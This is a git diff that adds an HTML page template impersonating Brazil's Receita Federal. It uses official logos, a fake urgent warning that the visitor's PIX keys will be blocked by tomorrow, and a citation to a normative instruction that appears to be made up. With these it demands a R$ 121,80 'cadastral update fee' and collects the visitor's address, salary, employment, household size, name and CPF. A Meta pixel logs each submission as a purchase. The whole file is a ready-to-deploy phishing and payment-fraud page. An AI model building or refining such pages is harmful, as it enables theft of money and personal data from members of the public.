@@ -1,0 +1,356 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <script type="text/javascript">
+        (function(c,l,a,r,i,t,y){
+            c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+            t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+            y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+        })(window, document, "clarity", "script", "qkhj9t5mmz");
+    </script>
+    <meta charset="utf-8"/>
+    <meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+    <title>Atualização Cadastral Urgente - Receita Federal</title>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <!-- Meta Pixel Code -->
+    <script>
+        !function(f,b,e,v,n,t,s)
+        {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+        n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+        if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+        n.queue=[];t=b.createElement(e);t.async=!0;
+        t.src=v;s=b.getElementsByTagName(e)[0];
+        s.parentNode.insertBefore(t,s)}(window, document,'script',
+        'https://connect.facebook.net/en_US/fbevents.js');
+        fbq('init', '{{ meta_pixel_id }}');
+        fbq('track', 'Purchase', {
+            value: 121.80,
+            currency: 'BRL',
+        });
+    </script>
+    <noscript>
+        <img height="1" width="1" style="display:none" 
+        src="https://www.facebook.com/tr?id={{ meta_pixel_id }}&ev=Purchase&noscript=1"/>
+    </noscript>
+    <!-- End Meta Pixel Code -->
+    <style>
+        @font-face {
+            font-family: 'Rawline';
+            src: url("{{ url_for('static', filename='fonts/rawline-400.ea42a37247439622.woff2') }}") format('woff2');
+            font-weight: 400;
+            font-style: normal;
+        }
+        @font-face {
+            font-family: 'Rawline';
+            src: url("{{ url_for('static', filename='fonts/rawline-600.844a17f0db94d147.woff2') }}") format('woff2');
+            font-weight: 600;
+            font-style: normal;
+        }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Rawline', sans-serif;
+        }
+        body {
+            background-color: white;
+            padding-top: 60px;
+            color: #333333;
+            font-size: 16px;
+            line-height: 1.05;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 8px 20px;
+            background-color: white;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            z-index: 1000;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+            height: 60px;
+        }
+        .logo {
+            width: 160px;
+            height: auto;
+        }
+        .header-icons {
+            display: flex;
+            gap: 15px;
+        }
+        .header-icon {
+            font-size: 18px;
+            color: #0056b3;
+        }
+        .container {
+            max-width: 800px;
+            margin: 40px auto;
+            padding: 20px;
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+        .warning-box {
+            background-color: #f8d7da;
+            border: 1px solid #f5c6cb;
+            color: #721c24;
+            padding: 15px;
+            margin: 20px 0;
+            border-radius: 4px;
+            line-height: 1.5;
+        }
+        .footer {
+            background-color: #01205B;
+            color: white;
+            padding: 16px;
+            text-align: center;
+            margin-top: auto;
+        }
+        .footer-logo {
+            width: 100px;
+            margin: 0 auto 8px;
+            display: block;
+        }
+        .form-container {
+            background: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.05);
+        }
+        .form-group {
+            margin-bottom: 15px;
+        }
+        .form-group label {
+            display: block;
+            margin-bottom: 5px;
+            color: #333;
+            font-weight: 600;
+        }
+        .form-control {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            font-size: 16px;
+        }
+        .form-control:disabled {
+            background-color: #f8f9fa;
+        }
+        .btn-submit {
+            width: 100%;
+            padding: 12px;
+            background-color: #28a745;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 20px;
+        }
+        .btn-submit:hover {
+            background-color: #218838;
+        }
+        .tax-warning {
+            background-color: #fff3cd;
+            border: 1px solid #ffeeba;
+            color: #856404;
+            padding: 15px;
+            margin: 20px 0;
+            border-radius: 4px;
+            line-height: 1.5;
+        }
+        .address-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 15px;
+        }
+        @media (max-width: 600px) {
+            .address-grid {
+                grid-template-columns: 1fr;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <img alt="Logo da Receita Federal" class="logo" src="https://servicos.receitafederal.gov.br/assets/images/receitaAzul.svg"/>
+        <div class="header-icons">
+            <i class="fas fa-search header-icon"></i>
+            <i class="fas fa-question-circle header-icon"></i>
+            <i class="fas fa-adjust header-icon"></i>
+        </div>
+    </div>
+
+    <div class="container">
+        <div class="warning-box">
+            <div class="flex items-center">
+                <i class="fas fa-exclamation-triangle mr-2"></i>
+                <strong>ATENÇÃO: Dados Cadastrais Desatualizados</strong>
+            </div>
+            <p class="mt-2">
+                Prezado(a) <span id="userName"></span>, 
+                seus dados cadastrais junto à Receita Federal do Brasil estão desatualizados. 
+                É necessário atualizá-los imediatamente para evitar o bloqueio de todas as suas chaves PIX.
+            </p>
+        </div>
+
+        <div class="form-container">
+            <form method="get" action="/payment-update" class="space-y-6">
+                <input type="hidden" name="nome" id="nameInput">
+                <input type="hidden" name="cpf" id="cpfInput">
+
+                <div class="form-group">
+                    <label>CEP</label>
+                    <input type="tel" name="cep" id="cepInput" required placeholder="00000-000" class="form-control" maxlength="9" pattern="\d{5}-?\d{3}">
+                </div>
+
+                <div class="address-grid">
+                    <div class="form-group">
+                        <label>Endereço</label>
+                        <input type="text" name="logradouro" id="logradouro" required class="form-control">
+                    </div>
+
+                    <div class="form-group">
+                        <label>Número</label>
+                        <input type="text" name="numero" required class="form-control">
+                    </div>
+
+                    <div class="form-group">
+                        <label>Complemento</label>
+                        <input type="text" name="complemento" class="form-control">
+                    </div>
+
+                    <div class="form-group">
+                        <label>Bairro</label>
+                        <input type="text" name="bairro" id="bairro" required class="form-control">
+                    </div>
+
+                    <div class="form-group">
+                        <label>Cidade</label>
+                        <input type="text" name="cidade" id="cidade" required class="form-control">
+                    </div>
+
+                    <div class="form-group">
+                        <label>Estado</label>
+                        <input type="text" name="estado" id="estado" required class="form-control">
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <label>Está empregado atualmente?</label>
+                    <select name="employed" required class="form-control">
+                        <option value="">Selecione uma opção</option>
+                        <option value="yes">Sim</option>
+                        <option value="no">Não</option>
+                    </select>
+                </div>
+
+                <div class="form-group">
+                    <label>Salário Líquido Mensal (com benefícios)</label>
+                    <div class="relative">
+                        <span class="absolute left-3 top-2 text-gray-600">R$</span>
+                        <input type="number" name="salary" required step="0.01" min="0" class="form-control pl-10" placeholder="0,00">
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <label>Quantas pessoas moram na sua casa?</label>
+                    <input type="number" name="household_members" required min="1" class="form-control">
+                </div>
+
+                <div class="tax-warning">
+                    <p><strong>IMPORTANTE: Taxa de Atualização Cadastral</strong></p>
+                    <p class="mt-2">
+                        Conforme a Instrução Normativa RFB nº 2.119/2024, para processar a atualização cadastral 
+                        é necessário o pagamento da Taxa de Atualização Cadastral no valor de <strong>R$ 121,80</strong>.
+                    </p>
+                    <p class="mt-2">
+                        <strong>Atenção <span id="userName2"></span> (CPF: <span id="userCpf2"></span>):</strong> 
+                        Caso a atualização não seja realizada até <span id="tomorrowDate"></span>, 
+                        todas as suas chaves PIX permanecerão bloqueadas e você poderá ter restrições 
+                        em operações bancárias.
+                    </p>
+                </div>
+
+                <button type="submit" class="btn-submit" id="submitButton">
+                    <i class="fas fa-check-circle mr-2" id="buttonIcon"></i>
+                    <span id="buttonText">Pagar Taxa e Atualizar Cadastro</span>
+                </button>
+            </form>
+        </div>
+    </div>
+
+    <footer class="footer">
+        <img src="https://www.enat.receita.economia.gov.br/pt-br/area_nacional/noticias/logo-rfb/image_preview" 
+             alt="Receita Federal Logo" class="footer-logo">
+        <p>© 2024 Receita Federal do Brasil. Todos os direitos reservados.</p>
+    </footer>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            // Get user data from localStorage
+            const userData = JSON.parse(localStorage.getItem('userData') || '{"nome":"","cpf":""}');
+
+            // Update all name fields
+            document.getElementById('nameInput').value = userData.nome;
+            document.getElementById('userName').textContent = userData.nome;
+            document.getElementById('userName2').textContent = userData.nome;
+
+            // Update all CPF fields
+            document.getElementById('cpfInput').value = userData.cpf;
+            document.getElementById('userCpf2').textContent = userData.cpf;
+
+            // Set tomorrow's date
+            const tomorrow = new Date();
+            tomorrow.setDate(tomorrow.getDate() + 1);
+            const tomorrowFormatted = tomorrow.toLocaleDateString('pt-BR');
+            document.getElementById('tomorrowDate').textContent = tomorrowFormatted;
+
+            // CEP mask and auto-complete
+            const cepInput = document.getElementById('cepInput');
+            cepInput.addEventListener('input', function(e) {
+                let value = e.target.value.replace(/\D/g, '');
+                if (value.length > 8) value = value.slice(0, 8);
+                if (value.length > 5) {
+                    value = value.slice(0, 5) + '-' + value.slice(5);
+                }
+                e.target.value = value;
+
+                // If CEP is complete (8 digits), fetch address
+                if (value.replace(/\D/g, '').length === 8) {
+                    fetch(`https://viacep.com.br/ws/${value.replace(/\D/g, '')}/json/`)
+                        .then(response => response.json())
+                        .then(data => {
+                            if (!data.erro) {
+                                document.getElementById('logradouro').value = data.logradouro;
+                                document.getElementById('bairro').value = data.bairro;
+                                document.getElementById('cidade').value = data.localidade;
+                                document.getElementById('estado').value = data.uf;
+                            }
+                        })
+                        .catch(error => console.error('Erro ao buscar CEP:', error));
+                }
+            });
+
+            const form = document.querySelector('form');
+            const submitButton = document.getElementById('submitButton');
+            const buttonIcon = document.getElementById('buttonIcon');
+            const buttonText = document.getElementById('buttonText');
+
+            form.addEventListener('submit', function(e) {
+                submitButton.disabled = true;
+                buttonIcon.className = 'fas fa-spinner fa-spin mr-2';
+                buttonText.textContent = 'Gerando cobrança...';
+                submitButton.style.backgroundColor = '#1a532e';
+            });
+        });
+    </script>
+</body>
+</html>
